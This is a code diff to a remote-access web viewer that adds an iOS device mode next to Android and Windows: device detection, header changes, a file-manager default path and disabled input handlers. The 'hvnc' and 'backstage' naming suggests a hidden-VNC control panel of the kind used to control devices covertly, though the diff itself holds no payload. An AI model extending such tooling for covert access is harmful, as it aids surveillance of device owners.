@@ -1134,6 +1134,7 @@
         const agentId = getAgentId();
         const sessionMode = getSessionMode();
         let isAndroidDevice = false;
+        let isIosDevice = false;
         let touchDragState = null;
 
         function escapeHtml(str) {
@@ -1149,8 +1150,13 @@
         async function detectDeviceType() {
             try {
                 const urlParams = new URLSearchParams(window.location.search);
-                if (urlParams.get("platform") === "android") {
+                const platParam = (urlParams.get("platform") || "").toLowerCase();
+                if (platParam === "ios" || platParam === "iphone" || platParam === "ipad") {
+                    applyIosMode();
+                    return;
+                } else if (platParam === "android") {
                     applyAndroidMode();
+                    return;
                 }
                 const res = await fetch('/api/agents');
                 if (res.ok) {
@@ -1160,7 +1166,9 @@
                         const osStr = (ag.os || "").toLowerCase();
                         const archStr = (ag.arch || "").toLowerCase();
                         const platStr = (ag.platform || "").toLowerCase();
-                        if (ag.is_android || archStr === "android" || platStr === "android" || osStr.includes("android")) {
+                        if (ag.is_ios || platStr === "ios" || archStr === "ios" || osStr.includes("ios") || osStr.includes("iphone") || osStr.includes("ipad")) {
+                            applyIosMode(ag);
+                        } else if (ag.is_android || archStr === "android" || platStr === "android" || osStr.includes("android")) {
                             applyAndroidMode(ag);
                         } else {
                             applyWindowsMode(ag);
@@ -1172,8 +1180,46 @@
             }
         }
 
+        function applyIosMode(agentInfo) {
+            isIosDevice = true;
+            isAndroidDevice = false;
+            const wrapper = document.getElementById("smartphoneWrapper");
+            if (wrapper) {
+                wrapper.classList.remove("desktop-mode");
+                wrapper.classList.add("android-mode");
+            }
+
+            const bkAct = document.getElementById("backstageHeaderActions");
+            const mrAct = document.getElementById("mirrorHeaderActions");
+            const andAct = document.getElementById("androidHeaderActions");
+            const winAct = document.getElementById("windowsHeaderActions");
+            const startBtn = document.getElementById("startBtnTrigger");
+            const startModal = document.getElementById("startMenuModal");
+
+            if (bkAct) bkAct.style.display = "none";
+            if (mrAct) mrAct.style.display = "none";
+            if (winAct) winAct.style.display = "none";
+            if (startBtn) startBtn.style.display = "none";
+            if (startModal) startModal.classList.remove("open");
+            if (andAct) andAct.style.display = "flex";
+
+            const targetTitle = document.getElementById("hvncTargetTitle");
+            if (targetTitle) {
+                const devName = (agentInfo && (agentInfo.endpoint_tag || agentInfo.hostname || agentInfo.device_name)) ? (agentInfo.endpoint_tag || agentInfo.hostname || agentInfo.device_name) : 'Apple iOS Device';
+                targetTitle.innerHTML = `
+                    <span style="width: 7px; height: 7px; border-radius: 50%; background: #60a5fa; box-shadow: 0 0 8px #60a5fa; animation: pulseDot 1.5s infinite;"></span>
+                    <span>🍎 [${escapeHtml(agentId)}] ${escapeHtml(devName)}</span>
+                    <span style="margin-left: 6px; padding: 2px 7px; border-radius: 4px; font-size: 10px; font-weight: 700; background: rgba(96, 165, 250, 0.15); border: 1px solid rgba(96, 165, 250, 0.4); color: #93c5fd; letter-spacing: 0.5px;">IOS MIRROR</span>
+                `;
+            }
+            document.title = `TRMM [iOS Mirror] — [${agentId}]`;
+
+            resizeDisplay();
+        }
+
         function applyAndroidMode(agentInfo) {
             isAndroidDevice = true;
+            isIosDevice = false;
             const wrapper = document.getElementById("smartphoneWrapper");
             if (wrapper) {
                 wrapper.classList.remove("desktop-mode");
@@ -1209,7 +1255,7 @@
         }
 
         function applyWindowsMode(agentInfo) {
-            if (isAndroidDevice) return;
+            if (isAndroidDevice || isIosDevice) return;
             const isMirror = (sessionMode === 'mirror');
             const winAct = document.getElementById("windowsHeaderActions");
             const bkAct = document.getElementById("backstageHeaderActions");
@@ -1270,10 +1316,10 @@
             }
             const titleEl = document.getElementById("fmModalTitle");
             if (titleEl) {
-                titleEl.innerText = `Android File Manager — [${fmCurrentAgentId}]`;
+                titleEl.innerText = `${isIosDevice ? '🍎 iOS Device Files' : 'Android File Manager'} — [${fmCurrentAgentId}]`;
             }
             if (fmHistory.length === 0) {
-                fmLoadDirectory("/storage/emulated/0", true);
+                fmLoadDirectory(isIosDevice ? "/uploads" : "/storage/emulated/0", true);
             } else {
                 fmRefresh();
             }
@@ -2276,7 +2322,7 @@
                         if (hvncCanvas.width !== bitmap.width || hvncCanvas.height !== bitmap.height) {
                             hvncCanvas.width = bitmap.width;
                             hvncCanvas.height = bitmap.height;
-                            if (!isAndroidDevice && bitmap.height > bitmap.width * 1.15) {
+                            if (!isAndroidDevice && !isIosDevice && bitmap.height > bitmap.width * 1.15) {
                                 applyAndroidMode();
                             }
                             resizeDisplay();
@@ -2297,7 +2343,7 @@
                             if (hvncCanvas.width !== img.naturalWidth || hvncCanvas.height !== img.naturalHeight) {
                                 hvncCanvas.width = img.naturalWidth;
                                 hvncCanvas.height = img.naturalHeight;
-                                if (!isAndroidDevice && img.naturalHeight > img.naturalWidth * 1.15) {
+                                if (!isAndroidDevice && !isIosDevice && img.naturalHeight > img.naturalWidth * 1.15) {
                                     applyAndroidMode();
                                 }
                                 resizeDisplay();
@@ -2336,7 +2382,7 @@
 
         function resizeDisplay() {
             if (!hvncCanvas) return;
-            if (isAndroidDevice) {
+            if (isAndroidDevice || isIosDevice) {
                 const availH = window.innerHeight - 28 - 24; // Deduct top bar (28px) and stage padding (24px)
                 const srcW = hvncCanvas.width || 720;
                 const srcH = hvncCanvas.height || 1560;
@@ -2457,6 +2503,7 @@
             });
 
             hvncCanvas.addEventListener("mousedown", (e) => {
+                if (isIosDevice) return;
                 if (isAndroidDevice) {
                     lastMouseClientX = e.clientX;
                     lastMouseClientY = e.clientY;
@@ -2495,6 +2542,7 @@
             });
 
             hvncCanvas.addEventListener("mouseup", (e) => {
+                if (isIosDevice) return;
                 if (isAndroidDevice) {
                     if (!touchDragState) return;
                     const endCoords = getHvncCoordinates(e);
@@ -2566,6 +2614,7 @@
 
             hvncCanvas.addEventListener("wheel", (e) => {
                 e.preventDefault();
+                if (isIosDevice) return;
                 if (isAndroidDevice) {
                     sendViewerInput({
                         type: "wheel",
@@ -2607,6 +2656,7 @@
                     return;
                 }
 
+                if (isIosDevice) return;
                 if (isAndroidDevice) {
                     if (e.key === "Backspace") {
                         e.preventDefault();
